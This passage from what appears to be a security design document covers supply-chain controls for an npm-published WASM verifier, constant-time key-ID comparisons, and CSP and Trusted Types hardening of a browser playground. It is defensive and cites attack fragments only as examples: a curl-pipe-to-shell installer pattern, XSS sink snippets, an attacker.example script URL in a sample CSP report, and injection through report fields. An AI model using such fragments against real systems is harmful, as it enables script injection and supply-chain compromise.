  on manual `workflow_dispatch`. wasm-pack version pinned via
  `WASM_PACK_VERSION` env-var; **wasm-pack itself is installed via
  `cargo install wasm-pack --version $WASM_PACK_VERSION --locked`
  rather than the upstream `curl … init.sh | sh` shell installer**,
  so the artefact is reproducible from auditable crates.io source
  with its committed `Cargo.lock`. All `uses:` pinned to immutable
  SHAs.
- **Node.js end-to-end smoke (BOTH targets).** Before publish, the
  workflow runs `verify_trace_json` against the canonical bank-demo
  trace + bundle in `examples/golden-traces/` for **both** the
  `pkg-node` (CommonJS via `require`) and the `pkg-web` (ESM via
  `import()` with raw-WASM-bytes init) build outputs. Both must
  return `outcome.valid === true` and
  `Array.isArray(outcome.witness_failures)` before the publish step
  is allowed to run. A regression that broke the wasm-bindgen
  serialisation of `VerifyOutcome` in *either* JS-side glue layer
  (e.g. the V1.14 Scope J field disappearing from the ESM view but
  not the CommonJS view) trips the smoke before any artefact reaches
  npm.
- **Publish gate — defence-in-depth across three checks.** `npm
  publish` runs only when ALL of the following are true:
  (a) the trigger encodes a publish intent — either a `push` event
  with `github.ref` starting with `refs/tags/v` (release publish),
  OR a `workflow_dispatch` with `dry_run: false` *AND* `github.ref
  == 'refs/heads/master'` (manual approval from the default branch
  only — feature-branch dispatches cannot publish); (b) the
  `NPM_TOKEN` secret is present (fork PRs and unauthorised manual
  runs SKIP cleanly with `exit 0`); (c) the OIDC token mint required
  for `npm publish --provenance` is permitted via
  `permissions: id-token: write` *(latent placement bug — see
  scope-b)*. The scope-e workflow originally placed `id-token: write`
  at *step* level, which GitHub Actions silently drops; provenance
  attestation would have failed at runtime on the first `v*` tag
  push. V1.15 Welle B (see scope-b below) moves the grant to
  workflow level, removes the dead step-level block, and documents
  the rationale in the workflow YAML.
- **OIDC-signed `--provenance` on `npm publish`.** Both the web and
  the node tarballs are published with `npm publish --provenance`
  (npm ≥ 9.5), which attaches a Sigstore-rekor attestation linking
  the published bytes to the GitHub Actions run, repository, and
  commit SHA. Downstream consumers can verify via `npm audit
  signatures` or by inspecting the package's provenance card on the
  npm registry — they get cryptographic assurance that
  `@atlas-trust/verify-wasm@<version>` was built from
  `github.com/atlas-trust/<repo>@<commit-sha>` on a known GitHub
  Actions runner. This closes the "is this tarball really from the
  Atlas repo" supply-chain question without requiring downstream
  consumers to check out and rebuild from source.
- **Tarball artefacts (14-day retention).** Both build outputs are
  also packed via `npm pack` and uploaded as workflow artifacts.
  Auditors can fetch the exact bytes that would have shipped to npm
  for a given run without needing access to the registry — useful
  for diffing against a locally-built reproduction or for auditing
  a build that was later unpublished.
- **Browser playground.** `apps/wasm-playground/` is a zero-build-step
  static page (vanilla HTML + vanilla ESM, no bundler, no
  `package.json`) that loads the local `wasm-pack` output and lets a
  reviewer drop a `*.trace.json` + `*.pubkey-bundle.json` to verify
  in-browser. The page surfaces `outcome.witness_failures` (V1.14
  Scope J) so the auditor can see the structured wire surface
  end-to-end without writing any JS code.

### Trust property (Scope E)

**No new trust property.** Scope E is a *distribution-channel* change,
not a verifier-logic change. The byte-identical determinism property
already locked in by:

- `atlas-trust-core/src/cose.rs::signing_input_byte_determinism_pin`
  (V1.5),
- `atlas-trust-core/src/pubkey_bundle.rs::bundle_hash_byte_determinism_pin`
  (V1.5), and
- `atlas-signer/src/anchor.rs::mock_log_pubkey_matches_signer_seed`
  (V1.5)

means the WASM build produces the same signing-input bytes and the
same `VerifyOutcome` JSON as the native CLI, on the same input. A
verifier discrepancy between the WASM and native paths would trip the
native-side anti-drift tests at compile time. The npm package is the
same byte-deterministic verifier, just packaged for a different
runtime.

### Residual risks after V1.14 Scope E

- **Supply-chain compromise of the npm package.** A registry-side
  attack (compromised maintainer credentials, malicious squatter,
  npm typosquat) is the canonical risk for any npm-distributed
  artefact. Mitigations in scope: (a) the workflow tarball artifact
  lets an auditor diff the published bytes against a locally-built
  reproduction; (b) the package is published from a known-pinned CI
  lane (wasm-pack version + GitHub Action SHAs are immutable in the
  workflow file); (c) every published tarball ships with an
  OIDC-signed `--provenance` attestation that downstream consumers
  can verify via `npm audit signatures`, so a typosquatted or
  malicious replacement cannot forge the
  `github.com/atlas-trust/<repo>@<commit-sha>` build-source claim.
  Out of scope: lock-file pinning by downstream consumers,
  application-level integrity hashes for the WASM bytes — V1.15+
  candidates.
- **`NPM_TOKEN` secret rotation — operator runbook.** A leaked
  `NPM_TOKEN` lets an attacker publish a new version of
  `@atlas-trust/verify-wasm` under the project's name. Mitigations,
  in order of priority:
  - The configured token MUST be a **granular access token** scoped
    to publish-only on `@atlas-trust/verify-wasm` (npm v8.15+
    feature) — NOT a legacy "automation token" that grants
    organisation-wide write access. Operator action: when rotating,
    create the new token via npm's "Granular Access Tokens" UI,
    select "Packages and scopes" → `@atlas-trust/verify-wasm`,
    permission "Read and write", lifetime ≤ 1 year, IP allowlist if
    available. Document the resulting token's metadata (creation
    date, expiry, scope) in the team's secret-rotation log.
  - Rotate on a calendar cadence at minimum quarterly; rotate
    immediately on any maintainer offboarding. Treat the same
    blast-radius class as a Sigstore-rekor-prod credential.
  - The workflow uses `NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}`
    so the token is masked in run logs and not echoed via `set -x`.
  - The provenance attestation is *not* a substitute for token
    rotation: provenance proves the tarball's build source, but a
    leaked token can publish a tarball whose provenance points to a
    legitimate-looking commit on a fork or feature branch with
    smuggled content. Defence-in-depth: require the publish to fire
    only from a tag on the canonical repo (enforced via the publish
    gate's `startsWith(github.ref, 'refs/tags/v')` check) and
    ensure the repo's tag-protection rules forbid non-maintainers
    from creating `v*` tags on non-master branches. See "Tag
    protection" below.
- **Tag-protection — operator runbook.** The publish gate trusts
  that any `v*` tag pushed to the repo represents an authorised
  release. Enforce this in the GitHub repo settings (Settings →
  Tags → New rule):
  - Tag name pattern: `v*`
  - Restrict tag creation to repository administrators and the
    release-manager team. Non-maintainers who push a `v*` tag MUST
    be rejected at the GitHub layer before the workflow ever fires.
  - Reject force-pushes / deletes on tags matching `v*` so a
    rotated tag cannot be pointed at a different commit after a
    publish has fired.
  - Audit: every `wasm-publish.yml` run that fires under the `push`
    trigger logs `github.ref` and `github.actor`. Reconcile against
    the team's release log on a quarterly cadence.
- **Browser playground supply chain.** The playground is vanilla
  HTML + vanilla ESM with zero npm dependencies. The only external
  loaded asset is the local-built `pkg/atlas_verify_wasm.js` + WASM
  binary. An attacker who could inject content into the playground's
  served HTML could, in principle, swap the WASM module under the
  user's nose. Mitigation: the playground is meant for local-dev or
  audit-time use against a known-trusted checkout — the README
  documents the `wasm-pack build` invocation explicitly so the
  reviewer's flow is "build the artefact yourself, then open the
  playground". Production consumers should pull `@atlas-trust/verify-wasm`
  from npm (same Apache-2.0 source) rather than embedding the
  playground itself.
- **Cross-runtime serialisation drift.** `serde-wasm-bindgen` produces
  JS objects (not JSON strings) for the WASM bindings. An auditor
  that compares the WASM `outcome.witness_failures` against the
  native CLI's JSON `witness_failures` should explicitly
  `JSON.stringify` the WASM output and `JSON.parse` it for an
  apples-to-apples comparison — direct object comparison is sensitive
  to key insertion order, which `serde-wasm-bindgen` does not
  guarantee. Mitigation: the workflow's Node.js smoke proves the
  WASM-side `outcome.valid` matches the expected verdict; native-CLI
  parity is structurally guaranteed by the byte-identical-determinism
  pins above.

### What V1.14 Scope E does NOT cover

- **Mirror to a backup registry.** Single-registry deployment means
  npm registry availability is on the auditor's critical path for
  fresh installs. Vendoring or mirroring (e.g. to GitHub Packages)
  is out of scope for V1.14.
- **Browser-runtime hardening of the playground.** Page-side
  hardening shipped as **V1.16 Welle A — see scope-d below**: strict
  CSP via `<meta http-equiv>`, SRI on `app.js`, Trusted Types
  enforcement (`require-trusted-types-for 'script'; trusted-types
  'none'`), `X-Content-Type-Options: nosniff`, `Referrer-Policy:
  no-referrer`. Service-worker pinning and a JS-layer file-size cap
  (the Rust verifier already enforces `MAX_ITEMS_PER_LEVEL = 10_000`
  as an allocation cap, but the JS layer could gate before
  deserialising a multi-GB blob) remain deferred.
- **Browser SRI on the WASM module itself.** Subresource Integrity
  hashes are not attached to the `.wasm` binary in the playground
  because the loader (`wasm-pack`-emitted `pkg/atlas_verify_wasm.js`)
  drives the WASM fetch via `WebAssembly.instantiateStreaming` rather
  than a `<script>`/`<link>` tag where SRI is declarative. The
  `WebAssembly.compile` integrity-check spec (proposal stage) will
  close this once browsers ship it; until then `app.js` is SRI-pinned
  but the WASM binary is only protected by `script-src 'self'` +
  `connect-src 'self'` (same-origin policy). A hosting deployment
  that adds `Cache-Control: immutable` + `Content-Length` checks at
  the CDN layer is the current best-practice mitigation; tracking
  upstream as a V1.17+ Welle.

---

## scope-a — KID-equality const-time audit (V1.15 — shipped)

The verifier compares strings in two structurally distinct categories:
*hashes* (32-byte blake3 outputs and their 64-char hex encodings) and
*KIDs* (key identifiers — short, structured strings like
`atlas-anchor:ws-prod-eu` or `atlas-witness:org:host`). Atlas's stated
property is **byte-identical verification regardless of input shape**;
to honour it, both categories must compare in time independent of the
input's byte content.

V1.5 onwards routed every *hash* compare through `crate::ct::ct_eq_str`
(see `bundle_hash_byte_determinism_pin`, `signing_input_byte_determinism_pin`,
and the chain-walking `previous_head ↔ chain_head_for(prev_batch)` link
checks). V1.13 wave-C-2 routed the *witness-roster* lookup through the
same helper (the highest-impact KID-compare site, where an attacker-
controlled `witness_kid` lands on a pinned roster). V1.15 Welle A closes
the last `==` on a wire-side KID: the V1.9 per-tenant-keys strict-mode
check at `verify::verify_trace_with` previously compared
`event.signature.kid` against `per_tenant_kid_for(workspace_id)` via raw
byte-equality, and now routes through `ct_eq_str`.

### What landed in V1.15 Welle A

- **`verify::verify_trace_with` per-tenant strict-mode KID compare.** Raw
  `if ev.signature.kid == expected_kid` → `if crate::ct::ct_eq_str(&ev.signature.kid, &expected_kid)`.
  Inline anchor comment cross-references the const-time invariant.
- **`crate::ct` module-doc upgrade.** The module documentation now
  enumerates the six const-time-protected boundaries (bundle hash, event
  hash, anchored hash, chain head/previous-head, per-tenant KID, witness
  KID) plus three explicitly-not-covered cases (`BTreeMap`/`BTreeSet`
  scope-local lookups, integer field equality, operator-facing
  diagnostic Display paths) with the rationale for each exclusion.
- **Source-level anti-drift pin.** New
  `crates/atlas-trust-core/tests/const_time_kid_invariant.rs` audits the
  source bytes of `verify.rs` and `witness.rs`, asserting that no
  production-code line contains a forbidden raw-equality pattern
  (`.kid ==`, `.kid.eq(`, `.kid.as_str() ==`, `expected_kid ==`,
  `witness_kid ==`, `signature.kid ==`). Strips `#[cfg(test)] mod tests`
  blocks before scanning so legitimate `assert_eq!(kid, …)` test
  patterns don't false-positive. A future caller introducing a raw `==`
  on a KID field in either file fails the test at the next CI run.

### Trust property after V1.15 Welle A

**No new trust property.** Welle A is consistency hardening: the
const-time-equality invariant now extends across every wire-side KID
compare reachable from the public verifier API. The leak window for
`event.signature.kid` was theoretical — both `event.signature.kid` and
`per_tenant_kid_for(workspace_id)` are wire-side strings present in the
trace itself, so a successful timing attack would surface no new
attacker information — but the consistency win means a future reviewer
reading any `kid`-equality site sees the same `ct_eq_str` discipline.
The byte-identical-determinism pins from V1.5 (signing-input + bundle
hash) and the const-time-witness-roster invariant from V1.13 wave-C-2
together with this Welle close the const-time-everywhere story for
V1.x.

### Residual risks after V1.15 Welle A

- **`BTreeMap` / `BTreeSet` lookups within a single trace verification**
  (e.g. `verified_kids.contains(&w.witness_kid)`,
  `kid_counts.entry(w.witness_kid.as_str())`). These are scope-local
  accumulators built from the trace itself; their contents are kids
  already present in the same trace's batches. A timing leak from these
  structures could only surface kids the attacker already provided —
  no new information.
- **Operator-facing Display paths** (e.g. `WitnessFailure::Display`).
  These do not gate trust decisions; a leak is a leak of error-message
  content, which is already visible to the operator running the
  verifier.
- **Future KID-compare sites in new modules.** The anti-drift test
  audits only `verify.rs` and `witness.rs` today. A V1.16+ feature that
  introduces a KID-compare site in a new module must extend the audit
  list in `tests/const_time_kid_invariant.rs::FORBIDDEN`'s scope — there
  is no automatic discovery. The `crate::ct` module-doc enumerates the
  boundaries to make this discoverable; the test's per-file `assert_no_forbidden`
  call list documents the audit scope by source.

### What V1.15 Welle A does NOT cover

- **Const-time integer compares.** Batch indices, threshold counts, and
  similar numeric fields are compared with `==` and `<` as the data
  type intends. Const-time compare is structurally not applicable; the
  fields carry no secret-byte content.
- **Cryptographic primitives.** `verifying_key.verify_strict(input, sig)`
  internally performs constant-time scalar arithmetic per the
  `ed25519-dalek` crate's contract; this is not the V1.15 audit's
  scope.

---

## scope-b — Backup distribution channel via GitHub Releases (V1.15 Welle B — shipped)

V1.14 Scope E shipped `@atlas-trust/verify-wasm` to npmjs.org as the
sole distribution channel, with SLSA L3 OIDC `--provenance` signed at
publish time. Single-channel distribution leaves `npm install
@atlas-trust/verify-wasm` on the auditor's critical path: an npm-side
outage, account compromise, or registry-side tampering claim blocks
fresh installs until the registry recovers, even though the bytes
themselves are reproducible from the tagged commit. V1.15 Welle B
adds a second, independent distribution channel — GitHub Releases —
that serves the **byte-identical** `npm pack` tarballs alongside a
SHA256 manifest, so an auditor can verify and install offline of
npmjs.org when the primary channel is unreachable.

### What landed in V1.15 Welle B

- **Tag-triggered upload to GitHub Releases.** `.github/workflows/wasm-publish.yml`
  runs the existing `npm pack` step, then on every `refs/tags/v*`
  push uploads the resulting tarballs (`pkg-web` + `pkg-node`) plus
  a `tarball-sha256.txt` manifest as release assets. The publish to
  npmjs.org is unchanged — Welle B is purely additive. If the npm
  publish flakes, the GH-Release upload still fires (and vice
  versa); both channels can fail independently.
- **Filename-collision disambiguation.** `npm pack` derives the
  tarball filename from `package.json` (`<scope>-<name>-<version>.tgz`),
  and pkg-web + pkg-node share the same package name. The workflow
  copies each tarball to a `-web.tgz` / `-node.tgz` suffixed name
  before `gh release upload`. The npm-published tarballs are
  unaffected — npm publishes by package metadata, not by filename.
- **`tarball-sha256.txt` manifest.** A `sha256sum`-format manifest
  is uploaded alongside the tarballs so an auditor can run
  `sha256sum --check tarball-sha256.txt` to detect in-flight
  tampering on the download path. The manifest is generated inside
  the same workflow run that produced the tarballs, so a compromise
  of the GitHub-side asset upload would have to forge both the
  tarball and the manifest entries consistently.
- **`gh release upload` with `--clobber` + create-fallback.** The
  workflow tries `gh release view "${TAG}"` first; if a release
  already exists for the tag (e.g. created via the GitHub UI for
  release-notes drafting) it uploads with `--clobber` so a re-run
  on the same tag overwrites a partial upload. If no release
  exists, `gh release create` creates one with the assets attached.
  Both paths converge on the same end state.
- **Workflow-level OIDC + contents permissions.** The original V1.14
  Scope E workflow had `id-token: write` placed at *step* level.
  GitHub Actions silently ignores step-level `permissions:`; the
  OIDC grant must be at workflow or job level for `npm publish
  --provenance` to mint a token. This was a latent bug that would
  have failed at runtime on the first `v*` tag push (Scope E shipped
  before any tag was cut). V1.15 Welle B fixes it as part of the
  same workflow edit: `contents: write` (for `gh release upload`) and
  `id-token: write` (for `--provenance`) are now declared at workflow
  level, and the dead step-level block is removed.
- **Operator runbook — `OPERATOR-RUNBOOK.md` §12.** Documents the
  fall-back conditions, the `gh release download` flow, the
  `sha256sum --check` step, the optional cross-verification against
  `npm view … dist.integrity` (SHA512 base64) for an apples-to-apples
  byte check, and the `npm install ./local.tgz` install flow.
  Imports are unchanged — the in-tarball `package.json` name is
  `@atlas-trust/verify-wasm` regardless of source.

### Trust property after V1.15 Welle B

**No new trust property.** Welle B is a *distribution-resilience*
change, not a verifier-logic change. The byte-identical determinism
property locked in by the V1.5 signing-input + bundle-hash pins
(`signing_input_byte_determinism_pin`,
`bundle_hash_byte_determinism_pin`) and the SLSA L3 provenance
attestation from V1.14 Scope E both extend to the GH-Release tarball
unchanged: it is the same `npm pack` byte sequence emitted by the
same workflow run. An auditor who downloads the GH-Release tarball,
recomputes its SHA256, and checks the `tarball-sha256.txt` manifest
gets the same byte-level integrity guarantee as `npm audit signatures`
against the npmjs.org registry; the npm-side OIDC attestation is
verifiable against either channel's bytes (same SHA, same commit SHA).

### Residual risks after V1.15 Welle B

- **Both channels run on GitHub-hosted infrastructure.** npmjs.org
  is independent of GitHub, but the GH-Release backup is on the same
  provider as the source repo and the publish workflow itself. So
  Welle B hedges against npmjs-side failure (registry outage,
  account compromise, namespace tamper) but NOT against a GitHub-
  side failure (Actions outage, repo-takeover, `gh release` API
  outage). A both-failed scenario falls through to verifier-side
  reproducibility from source: `git clone` at the tagged commit,
  `wasm-pack build crates/atlas-verify-wasm --target web --release`,
  byte-identical to the published artefact (pinned by
  `WASM_PACK_VERSION` env in `wasm-publish.yml`).
- **No registry-API equivalence on the backup channel.** The GH-
  Release path serves raw tarballs only; it does not answer
  `npm view`, `npm search`, or registry metadata queries. Consumers
  using metadata-driven install logic (Renovate, Dependabot, lock-
  file resolvers that walk dist-tags) need the npmjs.org primary
  channel up. Welle B is a recovery channel for `npm install`, not
  a complete registry mirror.
- **Operator-driven, not transparent failover.** There is no DNS-
  level rewrite or proxy at `npm.atlas-trust.io` that auto-redirects
  `npm install` to the GH-Release on npmjs.org failure. Such a proxy
  would itself be a single point of failure with its own compromise
  surface, and ownership would belong to the same team that runs
  the primary publish. Welle B is the operator-driven path: detect
  the outage, run the recovery flow in §12, install from the local
  tarball. V2 territory if the auditor base ever justifies the
  ongoing operational burden of a transparent mirror.
- **Tag-protection rules apply equally to Welle B.** The
  `gh release create` / `gh release upload` step fires on
  `refs/tags/v*` push, same gating as the npm publish. A bad-actor
  push of a `v*` tag onto a smuggled-content commit would create a
  malicious GH-Release as well as a malicious npm publish. The
  scope-e operator-runbook tag-protection rules (Settings → Tags →
  restrict `v*` creation to release-managers, no force-push, no
  delete) defend both channels. The GH-Release upload uses
  `${{ github.token }}` (auto-minted, scoped to the repo,
  short-lived) rather than a long-lived PAT, so credential
  rotation for the backup channel is structurally different from
  `NPM_TOKEN` rotation: the token is per-run.
- **Both channels could be tampered simultaneously.** A successful
  attack on the GitHub Actions runner during a release publish
  could in principle inject identical malicious bytes to both
  channels — same workflow run, same tarball bytes uploaded to
  both. The SLSA provenance attestation links the published bytes
  to the commit SHA + workflow run, so the ultimate guarantee an
  auditor has against this class of attack is verifier-side
  reproducibility from source: a third party rebuilds from the
  tagged commit on independent infrastructure and byte-compares.
- **GH-Release-only tamper without `NPM_TOKEN` access.** An attacker
  with `contents: write` on the repo (e.g. compromised maintainer
  PAT, repo-takeover, but NOT runner compromise) but without the
  `NPM_TOKEN` secret can push a `v*` tag, which fires the workflow
  and uploads tarballs to GitHub Releases. The npm publish step
  exits early when `NPM_TOKEN` is absent (workflow line 325–328:
  `if [ -z "${NODE_AUTH_TOKEN:-}" ]; then echo "…skipping" ; exit 0`),
  so npm never receives a corresponding publish. An auditor who
  downloads from GH Releases and only runs the SHA256 manifest
  check (transport integrity) would see internally consistent
  bytes — the manifest matches the tarball — and proceed to
  install attacker-controlled code. The defence is the
  `OPERATOR-RUNBOOK.md` §12 step-3 cross-verify against
  `npm view @atlas-trust/verify-wasm@<version> dist.integrity`,
  which detects the mismatch (npm has no record of that version,
  or a different SHA512). Step 3 is therefore documented as
  **mandatory**, not optional, with `--ignore-scripts` on the
  install path as defence-in-depth against a tarball that bypasses
  the cross-check (e.g. an auditor who skips step 3 because npm is
  also down — fall through to verifier-side rebuild from source).

### What V1.15 Welle B does NOT cover

- **A complete registry mirror.** Welle B uploads tarballs but does
  not implement an npm-protocol-compatible registry endpoint. Tools
  that require a `npm view` / `npm search` / dist-tag resolution
  surface need npmjs.org reachable. A future Welle could host a
  read-only Verdaccio-style mirror behind `npm.atlas-trust.io`, but
  that introduces an operator surface (DNS, TLS cert, mirror process
  monitoring) that V1.15 explicitly defers.
- **Lock-file pinning recommendations for downstream consumers.**
  The auditor-side reproducibility story — what `package-lock.json`
  / `pnpm-lock.yaml` / `bun.lockb` line should consumers commit, how
  to re-pin after a backup-channel install, when to verify SLSA
  provenance — shipped as V1.15 Welle C in
  [CONSUMER-RUNBOOK.md](CONSUMER-RUNBOOK.md). Welle B is the upload
  side; Welle C is the consumer side; together they close the V1.15
  distribution-resilience story end-to-end.
- **Browser-runtime hardening.** Page-side hardening shipped as
  **V1.16 Welle A — see scope-d below**. WASM-binary SRI remains
  deferred (loader-driven `WebAssembly.instantiateStreaming`,
  declarative SRI not yet specced — see scope-e's "Browser SRI on
  the WASM module itself" residual-risk entry).

---

## scope-d — Browser-runtime hardening of the WASM playground (V1.16 Welle A + Welle B + Welle C — shipped)

The playground at `apps/wasm-playground/` (V1.14 Scope E) is a static
HTML page that loads the verifier WASM module locally via `wasm-pack`'s
emitted JS glue. V1.14 shipped it as a local-dev affordance: `wasm-pack
build`, then `npx serve` or `python3 -m http.server` against the local
checkout. V1.16 Welle A hardens it for any deployment beyond pure
local-dev — a hosted playground (e.g. `playground.atlas-trust.dev`) can
now resist injection attacks even when the surrounding network/CDN/proxy
is partially compromised, without requiring server-side header config.
V1.16 Welle B closes the Welle-A residual gap that CSP violations were
silent in production: the meta-tag CSP now declares `report-uri
/csp-report` so a deployed playground that runs a minimal receiver at
the same-origin path will surface every blocked violation as a JSON POST
(documented receiver-shape spec below). V1.16 Welle C is the
deployment-side closure: a Cloudflare Workers + Static Assets host
emits a Worker-layered security-header set (HSTS preload, COOP same-
origin, COEP require-corp, the same CSP as an HTTP header so
`frame-ancestors` finally takes effect, plus per-path Cache-Control)
on every response, runs an executable form of the receiver-shape spec
at `POST /csp-report` (silent-204 + categorised internal logs +
Origin-anchored CSRF + per-IP /64 rate limit + global rate limit +
JSON-bomb defence), and persists accepted reports as Workers Analytics
Engine datapoints with a daily AE → R2 archive heartbeat.

**Trust property (no new property):** the playground hardening is pure
defence-in-depth on the *delivery* of the verifier UI, not on the
verifier's correctness. The WASM-side trust properties (byte-determinism
pins, signature-integrity, hash-chain integrity, anchor verification)
are unchanged. What V1.16 Welle A buys is *resistance to UI-side
injection*: an attacker who manages to write to the served `index.html`
or `app.js` cannot trivially inject inline `<script>`, `eval()`,
`setTimeout("evil")`, `innerHTML = "<img onerror=…>"`, or arbitrary
network egress against an active operator's browser session.

### What scope-d covers

1. **Strict CSP via `<meta http-equiv="Content-Security-Policy">`.** The
   policy travels with the page bytes, so a static-hosting deployment
   does not depend on the hosting provider sending the right
   `Content-Security-Policy` HTTP header. (A correctly-configured host
   SHOULD also send the header — `frame-ancestors` is meta-tag-ignored
   in most browsers, only header-mode honours it. Defence-in-depth
   either way.) Directives:
   - `default-src 'none'` — every undeclared fetch directive denies by
     default (img, font, media, object, frame, child, manifest, worker).
   - `script-src 'self' 'wasm-unsafe-eval'` — same-origin scripts +
     dynamic `import('./pkg/...')` + the dedicated WebAssembly
     compilation keyword. Crucially does NOT include `'unsafe-inline'`
     or `'unsafe-eval'`, so JavaScript `eval()` / `new Function()` /
     inline `<script>...</script>` / `setTimeout("string")` /
     `setInterval("string")` / `<a href="javascript:…">` are all
     blocked.
   - `style-src 'self' 'unsafe-inline'` — keep the small inline `<style>`
     block in `index.html`. CSS-injection is a much lower-severity sink
     than script-injection (no JS exec, no DOM API access); avoiding
     `'unsafe-inline'` here would force a build step. Tradeoff
     accepted; revisit if a build pipeline gets introduced.
   - `connect-src 'self'` — only same-origin fetch / dynamic-import /
     WebSocket egress.
   - `form-action 'none'`, `frame-ancestors 'none'`, `base-uri 'none'`
     — submission / clickjacking / base-anchor attacks blocked.
   - `require-trusted-types-for 'script'` + `trusted-types 'none'` —
     every script-related sink (`innerHTML`, `outerHTML`,
     `document.write`, `setTimeout(string)`, setting `*.src` on script
     elements, …) MUST receive a TrustedHTML/TrustedScriptURL value,
     but no policy is allowed to mint one. The application is sink-free
     by construction (`app.js` uses only `textContent`, `className`,
     `style.display`), so any future regression that re-introduces a
     sink fails at the browser boundary, not at code-review time. This
     is the load-bearing TT setting for sink-free apps.

2. **Subresource Integrity (sha384) on `app.js`.** The application code
   was extracted from the inline `<script type="module">` in
   `index.html` into a sibling `app.js` so the loading `<script>` tag
   can carry an `integrity="sha384-…"` attribute. If the served bytes
   of `app.js` don't match the pinned hash, the browser refuses to
   execute the module. `crossorigin="anonymous"` is also set on the
   tag — required for SRI to take effect on module scripts in some
   browsers, and ensures no cookies are sent on the fetch.

3. **`X-Content-Type-Options: nosniff`** + **`Referrer-Policy:
   no-referrer`** via `<meta http-equiv>` — block MIME-sniffing on
   script content (defence against attacker-served `<script src>`
   pointing at a non-JS asset that the browser would otherwise sniff
   as JS) and prevent referrer leakage on outbound resource fetches.

4. **Anti-drift script `tools/playground-csp-check.sh`.** Pure-bash
   validator (no Node/Python dependency) that:
   - asserts the CSP meta-tag declares all required V1.16 Welle A
     directives;
   - asserts no `'unsafe-inline'` regression on `script-src` (style-src
     is the documented exception);
   - asserts no `'unsafe-eval'` regression (only `'wasm-unsafe-eval'`
     is allowed);
   - asserts the SRI hash on the `<script src="app.js">` tag matches
     the actual sha384 of `apps/wasm-playground/app.js`;
   - asserts `crossorigin="anonymous"` is present;
   - audits `pkg/atlas_verify_wasm.js` (when present) for TT-protected
     sinks (`eval`, `new Function`, `innerHTML`, `outerHTML`,
     `document.write`, `insertAdjacentHTML`, `setTimeout(string)`,
     `setInterval(string)`, `*.text =`) — closes the F-1 risk that
     a future wasm-bindgen release silently introduces a sink that
     would break the page under TT enforcement;
   - emits a WARN (not a hard fail) on `frame-ancestors 'none'` to
     remind the operator that meta-tag delivery is browser-ignored
     for that directive, so CI green ≠ clickjacking-protected.

   `--update-sri` flag re-pins the hash after a legitimate `app.js`
   edit; pre-flight asserts an existing `integrity=` attribute is
   present (refuses to "update" a tag that has no integrity attribute,
   closing a silent-no-op false-positive PASS). Without flags, the
   script exits non-zero on any drift — suitable for a CI step.

5. **wasm-bindgen TT-compatibility baseline.** The pinned wasm-bindgen
   version at the time of V1.16 Welle A is `0.2.118`. Empirical audit
   of the emitted `pkg/atlas_verify_wasm.js` (run via
   `tools/playground-csp-check.sh` after `wasm-pack build`) confirms
   the `--target web` glue is TT-sink-free: it uses
   `WebAssembly.instantiateStreaming` / `WebAssembly.instantiate` and
   `fetch` (CSP-friendly under `script-src 'self' 'wasm-unsafe-eval'`
   + `connect-src 'self'`) but contains no `eval`, no `new Function`,
   no `innerHTML`/`outerHTML`/`document.write`, no `setTimeout`/
   `setInterval` with string arguments, no `script.text` /
   `script.src` assignments. Future wasm-bindgen upgrades MUST re-run
   the validator to confirm continued TT-compat; the validator's
   `pkg/` audit is the load-bearing pin.

6. **CSP violation reporting via `report-uri /csp-report` (V1.16
   Welle B).** The meta-tag CSP now declares `report-uri /csp-report`.
   On every CSP violation (blocked inline script, blocked external
   script, blocked TT sink, etc.) the browser POSTs a JSON report to
   `/csp-report` (same-origin) with `Content-Type: application/csp-report`.
   The CSP enforcement is unchanged — the violation is still BLOCKED
   regardless of whether the report POST succeeds — but a deployed
   playground that runs a receiver at that path will see every attempt
   instead of relying on operators to spot the page break in DevTools.

   **Receiver-shape spec (what to implement at `/csp-report`):**

   - **Method:** `POST`
   - **Content-Type:** `application/csp-report` (some browsers also
     send `application/json`; accept both)
   - **Body:** JSON object with a single `csp-report` key:
     ```json
     {
       "csp-report": {
         "document-uri":       "https://playground.example/",
         "referrer":           "",
         "violated-directive": "script-src 'self' 'wasm-unsafe-eval'",
         "effective-directive":"script-src",
         "original-policy":    "default-src 'none'; script-src 'self' …",
         "blocked-uri":        "https://attacker.example/evil.js",
         "status-code":        0,
         "script-sample":      ""
       }
     }
     ```
   - **Response:** `204 No Content` (browsers ignore the body; status
     code only matters for server-side log noise reduction).
   > ⚠️ **READ THIS FIRST — ATTACKER-CONTROLLED FIELDS.** An XSS
   > attacker who triggers a CSP violation *chooses* the values that end
   > up in `blocked-uri`, `script-sample`, `document-uri` (query string
   > / fragment), `referrer`, and even `violated-directive` (when a
   > `style-src` violation occurs in a context an attacker controls).
   > The browser does NOT sanitise these — it forwards them verbatim.
   > A naive receiver that pipes the raw report body into:
   >
   > - a monitoring dashboard rendering `blocked-uri` as `<a href>` →
   >   stored XSS in the operator's own UI.
   > - a templating engine without per-field escaping → stored XSS
   >   wherever the template is consumed.
   > - a terminal-rendered log (`tail -f`, `journalctl`, container log
   >   viewers) → ANSI-escape injection (`\x1b[…m` sequences from a
   >   crafted `script-sample` can rewrite the operator's terminal).
   > - a webhook / Slack / email forwarder → cross-system injection.
   >
   > Treat ALL fields below as opaque untrusted strings. Escape per
   > sink. Strip ANSI control characters before any terminal-rendered
   > log write. Do NOT URL-follow `blocked-uri`. Do NOT render
   > `script-sample` as HTML anywhere.

   - **Recommended receiver behaviour:**

     | Requirement | Rationale |
     |---|---|
     | Treat ALL report fields as ATTACKER-CONTROLLED (see callout above) | XSS attacker chooses `blocked-uri`/`script-sample`/`document-uri` query string/`referrer`. Stored XSS in operator's monitoring UI is the dominant failure mode. ANSI-escape injection on terminal-rendered logs is the secondary one. |
     | Validate the `Origin` request header server-side (genuine browser CSP POSTs send `Origin` matching the page origin) | Independent of the report body, gives a receiver-side anchor that doesn't rely on trusting attacker-controlled JSON. Drop POSTs whose `Origin` is absent or mismatched. Closes the cross-origin spoofing case `original-policy` validation alone misses. |
     | Accept ONLY `Content-Type: application/csp-report` or `application/json` | Block CSV/text/etc. payloads from naive forging. |
     | Enforce a body-size cap (≤ 64 KB before parse) | Browser-sent reports are a few KB; uncapped POSTs are a flood vector. |
     | Schema-validate `original-policy` against the deployed CSP | Reject reports whose claimed policy doesn't match — a second forgery filter behind `Origin`. |
     | Schema-validate `document-uri` origin against the expected playground origin | Closes the "same-origin attacker forges with valid `original-policy`" subcase the policy match alone misses. |
     | Per-IP rate limit (drop after N reports/sec) | A compromised page or direct POST can spam reports. |
     | Append-only log, one JSON line per report, server-timestamp prefix | Cheap to operate; analysable with grep/jq. After ANSI-stripping per the callout. |
